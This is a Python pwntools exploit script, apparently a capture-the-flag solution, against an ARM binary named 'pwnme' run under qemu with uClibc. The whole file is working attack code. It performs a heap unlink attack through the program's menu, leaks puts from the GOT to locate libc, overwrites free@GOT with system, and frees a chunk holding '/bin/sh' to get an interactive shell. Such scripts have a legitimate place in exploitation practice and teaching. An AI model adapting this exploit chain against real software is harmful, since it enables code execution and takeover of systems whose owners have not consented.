#coding:utf8
from pwn import *

#sh = process(argv=['qemu-arm','-g','1234','-L','./','./pwnme'])
sh = process(argv=['qemu-arm','-L','./','./pwnme'])
elf = ELF('./pwnme')
puts_got = elf.got['puts']
free_got = elf.got['free']
libc = ELF('./libuClibc-1.0.34.so')

def show():
   sh.sendlineafter('>>>','1')

def add(size,content):
   sh.sendlineafter('>>>','2')
   sh.sendlineafter('Length:',str(size))
   sh.sendafter('Tag:',content)


def edit(index,size,content):
   sh.sendlineafter('>>>','3')
   sh.sendlineafter('Index:',str(index))
   sh.sendlineafter('Length:',str(size))
   sh.sendafter('Tag:',content)

def delete(index):
   sh.sendlineafter('>>>','4')
   sh.sendlineafter('Tag:',str(index))

def Exit():
   sh.sendlineafter('>>>','5')

add(0x80,'a'*0x80) #0
add(0x80,'b'*0x80) #1
add(0x10,'c'*0x10) #2

heap_ptr0_addr = 0x0002106C
payload = p32(0) + p32(0x81)
payload += p32(heap_ptr0_addr-0xC) + p32(heap_ptr0_addr-0x8)
payload = payload.ljust(0x80,'a')
payload += p32(0x80) + p32(0x88)
edit(0,0x88,payload)
#unlink
delete(1)
edit(0,0x80,p64(0) + p32(0x8) + p32(puts_got) + p32(0x8) + p32(free_got) + p32(0x8) + p32(0x00021068))
show()
sh.recvuntil('0 : ')
uclibc_base = u32(sh.recv(4)) - libc.sym['puts']
system_addr = uclibc_base + libc.sym['system']
binsh_addr = uclibc_base + libc.search('/bin/sh').next()
print 'uclibc_base=',hex(uclibc_base)
print 'system_addr=',hex(system_addr)
print 'binsh_addr=',hex(binsh_addr)
edit(1,0x4,p32(system_addr))
edit(2,0x8,'/bin/sh\x00')
#getshell
delete(2)

sh.interactive()
